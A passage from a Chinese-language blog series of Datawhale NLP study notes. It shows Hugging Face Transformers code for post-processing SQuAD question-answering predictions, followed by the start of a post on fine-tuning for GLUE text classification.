class="hljs-string">&quot;context&quot;</span>],<br>        examples[<span class="hljs-string">&quot;context&quot;</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;question&quot;</span>],<br>        truncation=<span class="hljs-string">&quot;only_second&quot;</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;only_first&quot;</span>,<br>        max_length=max_length,<br>        stride=doc_stride,<br>        return_overflowing_tokens=<span class="hljs-literal">True</span>,<br>        return_offsets_mapping=<span class="hljs-literal">True</span>,<br>        padding=<span class="hljs-string">&quot;max_length&quot;</span>,<br>    )<br><br>    <span class="hljs-comment"># Since one example might give us several features if it has a long context, we need a map from a feature to</span><br>    <span class="hljs-comment"># its corresponding example. This key gives us just that.</span><br>    sample_mapping = tokenized_examples.pop(<span class="hljs-string">&quot;overflow_to_sample_mapping&quot;</span>)<br><br>    <span class="hljs-comment"># We keep the example_id that gave us this feature and we will store the offset mappings.</span><br>    tokenized_examples[<span class="hljs-string">&quot;example_id&quot;</span>] = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tokenized_examples[<span class="hljs-string">&quot;input_ids&quot;</span>])):<br>        <span class="hljs-comment"># Grab the sequence corresponding to that example (to know what is the context and what is the question).</span><br>        sequence_ids = tokenized_examples.sequence_ids(i)<br>        context_index = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> pad_on_right <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># One example can give several spans, this is the index of the example containing this span of text.</span><br>        sample_index = sample_mapping[i]<br>        tokenized_examples[<span class="hljs-string">&quot;example_id&quot;</span>].append(examples[<span class="hljs-string">&quot;id&quot;</span>][sample_index])<br><br>        <span class="hljs-comment"># Set to None the offset_mapping that are not part of the context so it&#x27;s easy to determine if a token</span><br>        <span class="hljs-comment"># position is part of the context or not.</span><br>        tokenized_examples[<span class="hljs-string">&quot;offset_mapping&quot;</span>][i] = [<br>            (o <span class="hljs-keyword">if</span> sequence_ids[k] == context_index <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">for</span> k, o <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(tokenized_examples[<span class="hljs-string">&quot;offset_mapping&quot;</span>][i])<br>        ]<br><br>    <span class="hljs-keyword">return</span> tokenized_examples<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">validation_features = datasets[<span class="hljs-string">&quot;validation&quot;</span>].<span class="hljs-built_in">map</span>(<br>    prepare_validation_features,<br>    batched=<span class="hljs-literal">True</span>,<br>    remove_columns=datasets[<span class="hljs-string">&quot;validation&quot;</span>].column_names<br>)<br><br>HBox(children=(FloatProgress(value=<span class="hljs-number">0.0</span>, <span class="hljs-built_in">max</span>=<span class="hljs-number">11.0</span>), HTML(value=<span class="hljs-string">&#x27;&#x27;</span>)))<br></code></pre></td></tr></table></figure><p>使用<code>Trainer.predict</code>方法获得所有预测结果</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">raw_predictions</span> = trainer.predict(validation_features)<br></code></pre></td></tr></table></figure><p>这个 <code>Trainer</code> <em>隐藏了</em>一些模型训练时候没有使用的属性(这里是<code>example_id</code>和<code>offset_mapping</code>，后处理的时候会用到),所以我们需要把这些设置回来:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">validation_features.set_format(<span class="hljs-built_in">type</span>=validation_features.<span class="hljs-built_in">format</span>[<span class="hljs-string">&quot;type&quot;</span>], columns=<span class="hljs-built_in">list</span>(validation_features.features.keys()))<br></code></pre></td></tr></table></figure><p>当一个token位置对应着question部分时候，<code>prepare_validation_features</code>函数将offsetmappings设定为<code>None</code>，所以我们根据offsetmapping很容易可以鉴定token是否在context里面啦。我们同样也根绝扔掉了特别长的答案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">max_answer_length = <span class="hljs-number">30</span><br><br>start_logits = output.start_logits[<span class="hljs-number">0</span>].cpu().numpy()<br>end_logits = output.end_logits[<span class="hljs-number">0</span>].cpu().numpy()<br>offset_mapping = validation_features[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;offset_mapping&quot;</span>]<br><span class="hljs-comment"># The first feature comes from the first example. For the more general case, we will need to be match the example_id to</span><br><span class="hljs-comment"># an example index</span><br>context = datasets[<span class="hljs-string">&quot;validation&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;context&quot;</span>]<br><br><span class="hljs-comment"># Gather the indices the best start/end logits:</span><br>start_indexes = np.argsort(start_logits)[-<span class="hljs-number">1</span> : -n_best_size - <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>].tolist()<br>end_indexes = np.argsort(end_logits)[-<span class="hljs-number">1</span> : -n_best_size - <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>].tolist()<br>valid_answers = []<br><span class="hljs-keyword">for</span> start_index <span class="hljs-keyword">in</span> start_indexes:<br>    <span class="hljs-keyword">for</span> end_index <span class="hljs-keyword">in</span> end_indexes:<br>        <span class="hljs-comment"># Don&#x27;t consider out-of-scope answers, either because the indices are out of bounds or correspond</span><br>        <span class="hljs-comment"># to part of the input_ids that are not in the context.</span><br>        <span class="hljs-keyword">if</span> (<br>            start_index &gt;= <span class="hljs-built_in">len</span>(offset_mapping)<br>            <span class="hljs-keyword">or</span> end_index &gt;= <span class="hljs-built_in">len</span>(offset_mapping)<br>            <span class="hljs-keyword">or</span> offset_mapping[start_index] <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">or</span> offset_mapping[end_index] <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br>        ):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment"># Don&#x27;t consider answers with a length that is either &lt; 0 or &gt; max_answer_length.</span><br>        <span class="hljs-keyword">if</span> end_index &lt; start_index <span class="hljs-keyword">or</span> end_index - start_index + <span class="hljs-number">1</span> &gt; max_answer_length:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> start_index &lt;= end_index: <span class="hljs-comment"># We need to refine that test to check the answer is inside the context</span><br>            start_char = offset_mapping[start_index][<span class="hljs-number">0</span>]<br>            end_char = offset_mapping[end_index][<span class="hljs-number">1</span>]<br>            valid_answers.append(<br>                &#123;<br>                    <span class="hljs-string">&quot;score&quot;</span>: start_logits[start_index] + end_logits[end_index],<br>                    <span class="hljs-string">&quot;text&quot;</span>: context[start_char: end_char]<br>                &#125;<br>            )<br><br>valid_answers = <span class="hljs-built_in">sorted</span>(valid_answers, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;score&quot;</span>], reverse=<span class="hljs-literal">True</span>)[:n_best_size]<br>valid_answers<br></code></pre></td></tr></table></figure><p>将预测答案和真实答案进行比较即可：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs prolog">datasets[<span class="hljs-string">&quot;validation&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;answers&quot;</span>]<br><br>&#123;<span class="hljs-string">&#x27;answer_start&#x27;</span>: [<span class="hljs-number">177</span>, <span class="hljs-number">177</span>, <span class="hljs-number">177</span>],<br> <span class="hljs-string">&#x27;text&#x27;</span>: [<span class="hljs-string">&#x27;Denver Broncos&#x27;</span>, <span class="hljs-string">&#x27;Denver Broncos&#x27;</span>, <span class="hljs-string">&#x27;Denver Broncos&#x27;</span>]&#125;<br></code></pre></td></tr></table></figure><p>由于第1个feature一定是来自于第1个example，所以相对容易。对于其他的fearures来说，我们需要一个features和examples的一个映射map。同样，由于一个example可能被切片成多个features，所以我们也需要将所有features里的答案全部联系起来。以下的代码就将exmaple的下标和features的下标进行map映射。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> collections<br><br>examples = datasets[<span class="hljs-string">&quot;validation&quot;</span>]<br>features = validation_features<br><br>example_id_to_index = &#123;k: i <span class="hljs-keyword">for</span> i, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(examples[<span class="hljs-string">&quot;id&quot;</span>])&#125;<br>features_per_example = collections.defaultdict(<span class="hljs-built_in">list</span>)<br><span class="hljs-keyword">for</span> i, feature <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(features):<br>    features_per_example[example_id_to_index[feature[<span class="hljs-string">&quot;example_id&quot;</span>]]].append(i)<br></code></pre></td></tr></table></figure><p>最后一点事情是如何解决无答案的情况（squad_v2=True的时候）。以上的代码都只考虑了context里面的asnwers，所以我们同样需要将无答案的预测得分进行搜集（无答案的预测对应的CLStoken的start和end）。如果一个example样本又多个features，那么我们还需要在多个features里预测是不是都无答案。所以无答案的最终得分是所有features的无答案得分最小的那个。</p><p>只要无答案的最终得分高于其他所有答案的得分，那么该问题就是无答案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm.auto <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">postprocess_qa_predictions</span>(<span class="hljs-params">examples, features, raw_predictions, n_best_size = <span class="hljs-number">20</span>, max_answer_length = <span class="hljs-number">30</span></span>):<br>    all_start_logits, all_end_logits = raw_predictions<br>    <span class="hljs-comment"># Build a map example to its corresponding features.</span><br>    example_id_to_index = &#123;k: i <span class="hljs-keyword">for</span> i, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(examples[<span class="hljs-string">&quot;id&quot;</span>])&#125;<br>    features_per_example = collections.defaultdict(<span class="hljs-built_in">list</span>)<br>    <span class="hljs-keyword">for</span> i, feature <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(features):<br>        features_per_example[example_id_to_index[feature[<span class="hljs-string">&quot;example_id&quot;</span>]]].append(i)<br><br>    <span class="hljs-comment"># The dictionaries we have to fill.</span><br>    predictions = collections.OrderedDict()<br><br>    <span class="hljs-comment"># Logging.</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Post-processing <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(examples)&#125;</span> example predictions split into <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(features)&#125;</span> features.&quot;</span>)<br><br>    <span class="hljs-comment"># Let&#x27;s loop over all the examples!</span><br>    <span class="hljs-keyword">for</span> example_index, example <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(tqdm(examples)):<br>        <span class="hljs-comment"># Those are the indices of the features associated to the current example.</span><br>        feature_indices = features_per_example[example_index]<br><br>        min_null_score = <span class="hljs-literal">None</span> <span class="hljs-comment"># Only used if squad_v2 is True.</span><br>        valid_answers = []<br>        <br>        context = example[<span class="hljs-string">&quot;context&quot;</span>]<br>        <span class="hljs-comment"># Looping through all the features associated to the current example.</span><br>        <span class="hljs-keyword">for</span> feature_index <span class="hljs-keyword">in</span> feature_indices:<br>            <span class="hljs-comment"># We grab the predictions of the model for this feature.</span><br>            start_logits = all_start_logits[feature_index]<br>            end_logits = all_end_logits[feature_index]<br>            <span class="hljs-comment"># This is what will allow us to map some the positions in our logits to span of texts in the original</span><br>            <span class="hljs-comment"># context.</span><br>            offset_mapping = features[feature_index][<span class="hljs-string">&quot;offset_mapping&quot;</span>]<br><br>            <span class="hljs-comment"># Update minimum null prediction.</span><br>            cls_index = features[feature_index][<span class="hljs-string">&quot;input_ids&quot;</span>].index(tokenizer.cls_token_id)<br>            feature_null_score = start_logits[cls_index] + end_logits[cls_index]<br>            <span class="hljs-keyword">if</span> min_null_score <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> min_null_score &lt; feature_null_score:<br>                min_null_score = feature_null_score<br><br>            <span class="hljs-comment"># Go through all possibilities for the `n_best_size` greater start and end logits.</span><br>            start_indexes = np.argsort(start_logits)[-<span class="hljs-number">1</span> : -n_best_size - <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>].tolist()<br>            end_indexes = np.argsort(end_logits)[-<span class="hljs-number">1</span> : -n_best_size - <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>].tolist()<br>            <span class="hljs-keyword">for</span> start_index <span class="hljs-keyword">in</span> start_indexes:<br>                <span class="hljs-keyword">for</span> end_index <span class="hljs-keyword">in</span> end_indexes:<br>                    <span class="hljs-comment"># Don&#x27;t consider out-of-scope answers, either because the indices are out of bounds or correspond</span><br>                    <span class="hljs-comment"># to part of the input_ids that are not in the context.</span><br>                    <span class="hljs-keyword">if</span> (<br>                        start_index &gt;= <span class="hljs-built_in">len</span>(offset_mapping)<br>                        <span class="hljs-keyword">or</span> end_index &gt;= <span class="hljs-built_in">len</span>(offset_mapping)<br>                        <span class="hljs-keyword">or</span> offset_mapping[start_index] <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br>                        <span class="hljs-keyword">or</span> offset_mapping[end_index] <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span><br>                    ):<br>                        <span class="hljs-keyword">continue</span><br>                    <span class="hljs-comment"># Don&#x27;t consider answers with a length that is either &lt; 0 or &gt; max_answer_length.</span><br>                    <span class="hljs-keyword">if</span> end_index &lt; start_index <span class="hljs-keyword">or</span> end_index - start_index + <span class="hljs-number">1</span> &gt; max_answer_length:<br>                        <span class="hljs-keyword">continue</span><br><br>                    start_char = offset_mapping[start_index][<span class="hljs-number">0</span>]<br>                    end_char = offset_mapping[end_index][<span class="hljs-number">1</span>]<br>                    valid_answers.append(<br>                        &#123;<br>                            <span class="hljs-string">&quot;score&quot;</span>: start_logits[start_index] + end_logits[end_index],<br>                            <span class="hljs-string">&quot;text&quot;</span>: context[start_char: end_char]<br>                        &#125;<br>                    )<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(valid_answers) &gt; <span class="hljs-number">0</span>:<br>            best_answer = <span class="hljs-built_in">sorted</span>(valid_answers, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;score&quot;</span>], reverse=<span class="hljs-literal">True</span>)[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># In the very rare edge case we have not a single non-null prediction, we create a fake prediction to avoid</span><br>            <span class="hljs-comment"># failure.</span><br>            best_answer = &#123;<span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;score&quot;</span>: <span class="hljs-number">0.0</span>&#125;<br>        <br>        <span class="hljs-comment"># Let&#x27;s pick our final answer: the best one or the null answer (only for squad_v2)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> squad_v2:<br>            predictions[example[<span class="hljs-string">&quot;id&quot;</span>]] = best_answer[<span class="hljs-string">&quot;text&quot;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            answer = best_answer[<span class="hljs-string">&quot;text&quot;</span>] <span class="hljs-keyword">if</span> best_answer[<span class="hljs-string">&quot;score&quot;</span>] &gt; min_null_score <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br>            predictions[example[<span class="hljs-string">&quot;id&quot;</span>]] = answer<br><br>    <span class="hljs-keyword">return</span> predictions<br></code></pre></td></tr></table></figure><p>将后处理函数应用到原始预测上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">final_predictions = postprocess_qa_predictions(datasets[<span class="hljs-string">&quot;validation&quot;</span>], validation_features, raw_predictions.predictions)<br></code></pre></td></tr></table></figure><p>加载评价指标</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">metric = load<span class="hljs-constructor">_metric(<span class="hljs-string">&quot;squad_v2&quot;</span> <span class="hljs-params">if</span> <span class="hljs-params">squad_v2</span> <span class="hljs-params">else</span> <span class="hljs-string">&quot;squad&quot;</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> squad_v2:<br>    formatted_predictions = [&#123;<span class="hljs-string">&quot;id&quot;</span>: k, <span class="hljs-string">&quot;prediction_text&quot;</span>: v, <span class="hljs-string">&quot;no_answer_probability&quot;</span>: <span class="hljs-number">0.0</span>&#125; <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> predictions.items()]<br><span class="hljs-keyword">else</span>:<br>    formatted_predictions = [&#123;<span class="hljs-string">&quot;id&quot;</span>: k, <span class="hljs-string">&quot;prediction_text&quot;</span>: v&#125; <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> final_predictions.items()]<br>references = [&#123;<span class="hljs-string">&quot;id&quot;</span>: ex[<span class="hljs-string">&quot;id&quot;</span>], <span class="hljs-string">&quot;answers&quot;</span>: ex[<span class="hljs-string">&quot;answers&quot;</span>]&#125; <span class="hljs-keyword">for</span> ex <span class="hljs-keyword">in</span> datasets[<span class="hljs-string">&quot;validation&quot;</span>]]<br>metric.compute(predictions=formatted_predictions, references=references)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>自然语言处理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Datawhale组队学习</tag>
      
      <tag>NLP入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Transformers的自然语言处理(NLP)入门(四)</title>
    <link href="/2021/09/25/nlp-transformer/nlp-transformer-4/"/>
    <url>/2021/09/25/nlp-transformer/nlp-transformer-4/</url>
    
    <content type="html"><![CDATA[<p>本文为参加Datawhale组队学习时所写，如若需了解细致内容，请去到Datawhale官方开源课程<ahref="https://datawhalechina.github.io/learn-nlp-with-transformers/#/">基于transformers的自然语言处理(NLP)入门(datawhalechina.github.io)</a></p><h1 id="使用transoformer解决nlp问题">使用Transoformer解决NLP问题</h1><h2 id="文本分类">文本分类</h2><p>GLUE榜单包含了9个句子级别的分类任务，分别是：</p><ul><li><a href="https://nyu-mll.github.io/CoLA/">CoLA</a> (Corpus ofLinguistic Acceptability) 鉴别一个句子是否语法正确.</li><li><a href="https://arxiv.org/abs/1704.05426">MNLI</a> (Multi-GenreNatural Language Inference)给定一个假设，判断另一个句子与该假设的关系：entails, contradicts 或者unrelated。</li><li><ahref="https://www.microsoft.com/en-us/download/details.aspx?id=52398">MRPC</a>(Microsoft Research Paraphrase Corpus)判断两个句子是否互为paraphrases.</li><li><a href="https://rajpurkar.github.io/SQuAD-explorer/">QNLI</a>(Question-answering Natural Language Inference)判断第2句是否包含第1句问题的答案。</li><li><ahref="https://data.quora.com/First-Quora-Dataset-Release-Question-Pairs">QQP</a>(Quora Question Pairs2) 判断两个问句是否语义相同。</li><li><ahref="https://aclweb.org/aclwiki/Recognizing_Textual_Entailment">RTE</a>(Recognizing TextualEntailment)判断一个句子是否与假设成entail关系。</li><li><a href="https://nlp.stanford.edu/sentiment/index.html">SST-2</a>(Stanford Sentiment Treebank) 判断一个句子的情感正负向.</li><li><ahref="http://ixa2.si.ehu.es/stswiki/index.php/STSbenchmark">STS-B</a>(Semantic Textual Similarity Benchmark)判断两个句子的相似性（分数为1-5分）。</li><li><ahref="https://cs.nyu.edu/faculty/davise/papers/WinogradSchemas/WS.html">WNLI</a>(Winograd Natural Language Inference) Determine if a sentence with ananonymous pronoun and a sentence with this pronoun replaced are entailedor not.</li></ul><span id="more"></span><p>对于以上任务，我们将展示如何使用简单的Dataset库加载数据集，同时使用transformer中的<code>Trainer</code>接口对预训练模型进行微调。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  glue数据集的人物列表</span><br>GLUE_TASKS = [<span class="hljs-string">&quot;cola&quot;</span>, <span class="hljs-string">&quot;mnli&quot;</span>, <span class="hljs-string">&quot;mnli-mm&quot;</span>, <span class="hljs-string">&quot;mrpc&quot;</span>, <span class="hljs-string">&quot;qnli&quot;</span>, <span class="hljs-string">&quot;qqp&quot;</span>, <span class="hljs-string">&quot;rte&quot;</span>, <span class="hljs-string">&quot;sst2&quot;</span>, <span class="hljs-string">&quot;stsb&quot;</span>, <span class="hljs-string">&quot;wnli&quot;</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">task = <span class="hljs-string">&quot;cola&quot;</span><br>model_checkpoint = <span class="hljs-string">&quot;distilbert-base-uncased&quot;</span>  <span class="hljs-comment"># 模型权重检查点</span><br>batch_size = <span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><h3 id="加载数据">加载数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datasets <span class="hljs-keyword">import</span> load_dataset, load_metric<br><span class="hljs-comment">#  除mnli-mm任务，其他任务都可以通过任务名直接加载</span><br>actual_task = <span class="hljs-string">&quot;mnli&quot;</span> <span class="hljs-keyword">if</span> task == <span class="hljs-string">&quot;mnli-mm&quot;</span> <span class="hljs-keyword">else</span> task<br>dataset = load_dataset(<span class="hljs-string">&quot;glue&quot;</span>, actual_task)  <span class="hljs-comment"># 加载数据集</span><br>metric = load_metric(<span class="hljs-string">&#x27;glue&#x27;</span>, actual_task)  <span class="hljs-comment"># 加载metric评估标准</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  dataset结构</span><br>DatasetDict(&#123;<br>    train: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;sentence&#x27;</span>, <span class="hljs-string">&#x27;label&#x27;</span>, <span class="hljs-string">&#x27;idx&#x27;</span>],<br>        num_rows: <span class="hljs-number">8551</span><br>    &#125;)<br>    validation: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;sentence&#x27;</span>, <span class="hljs-string">&#x27;label&#x27;</span>, <span class="hljs-string">&#x27;idx&#x27;</span>],<br>        num_rows: <span class="hljs-number">1043</span><br>    &#125;)<br>    test: Dataset(&#123;<br>        features: [<span class="hljs-string">&#x27;sentence&#x27;</span>, <span class="hljs-string">&#x27;label&#x27;</span>, <span class="hljs-string">&#x27;idx&#x27;</span>],<br>        num_rows: <span class="hljs-number">1063</span><br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>随机选择数据集中的几个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datasets<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> IPython.display <span class="hljs-keyword">import</span> display, HTML<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_random_elements</span>(<span class="hljs-params">dataset, num_examples=<span class="hljs-number">10</span></span>):<br>    <span class="hljs-keyword">assert</span> num_examples &lt;= <span class="hljs-built_in">len</span>(dataset), <span class="hljs-string">&quot;Can&#x27;t pick more elements than there are in the dataset.&quot;</span><br>    picks = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_examples):<br>        pick = random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(dataset)-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">while</span> pick <span class="hljs-keyword">in</span> picks:<br>            pick = random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(dataset)-<span class="hljs-number">1</span>)<br>        picks.append(pick)<br>    <br>    df = pd.DataFrame(dataset[picks])<br>    <span class="hljs-keyword">for</span> column, typ <span class="hljs-keyword">in</span> dataset.features.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(typ, datasets.ClassLabel):<br>            df[column] = df[column].transform(<span class="hljs-keyword">lambda</span> i: typ.names[i])<br>    display(HTML(df.to_html()))<br><span class="hljs-comment"># 查看数据集具体信息</span><br>show_random_elements(dataset[<span class="hljs-string">&quot;train&quot;</span>])<br></code></pre></td></tr></table></figure><img src="/2021/09/25/nlp-transformer/nlp-transformer-4/image-20210925113158435.png" class="" title="dataset"><p>评估metric时datasets.Metric的一个实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 